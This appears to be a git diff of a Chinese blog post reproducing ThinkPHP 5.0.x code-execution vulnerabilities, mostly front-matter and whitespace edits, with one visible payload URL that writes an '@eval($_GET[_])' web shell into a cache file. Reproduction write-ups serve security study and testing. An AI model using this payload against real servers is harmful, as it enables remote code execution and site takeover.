@@ -1,5 +1,7 @@
+---
 title: ThinkPHP 5 代码执行漏洞复现+POC
 categories:
+
   - 漏洞复现
 tags:
   - 漏洞
@@ -7,8 +9,8 @@ tags:
   - 漏洞复现
   - ThinkPHP 5
   - ThinkPHP
-author: Chace
-date: 2020-06-09 20:07:00
+  - author: Chace
+  - date: 2020-06-09 20:07:00
 ---
 ## ThinkPHP 5.0.10 环境框架搭建
 
@@ -25,7 +27,7 @@ ThinkPHP是一个免费开源的，快速、简单的面向对象的轻量级PHP
 ### 版本
 
 >5.0.0<=ThinkPHP5<=5.0.10
-    
+
 ### 测试payload
 
 **漏洞利用条件**
@@ -39,7 +41,7 @@ ThinkPHP是一个免费开源的，快速、简单的面向对象的轻量级PHP
 构造payload如下：
 
 >http://127.0.0.1/public/?username=syst1m%0d%0a@eval($_GET[_]);//
-    
+
 成功在缓存文件写入payload
 
 ![](4.png)
@@ -55,7 +57,7 @@ ThinkPHP是一个免费开源的，快速、简单的面向对象的轻量级PHP
 ### 版本
 
 >5.0.0<=ThinkPHP5<=5.0.10
-    
+
 ### 测试payload
 
 >5.1.x ：
@@ -86,7 +88,7 @@ ThinkPHP是一个免费开源的，快速、简单的面向对象的轻量级PHP
 ### 版本
 
 >5.0.0<=ThinkPHP5<=5.0.10
-    
+
 ### 测试payload
 
 构造payload如下：
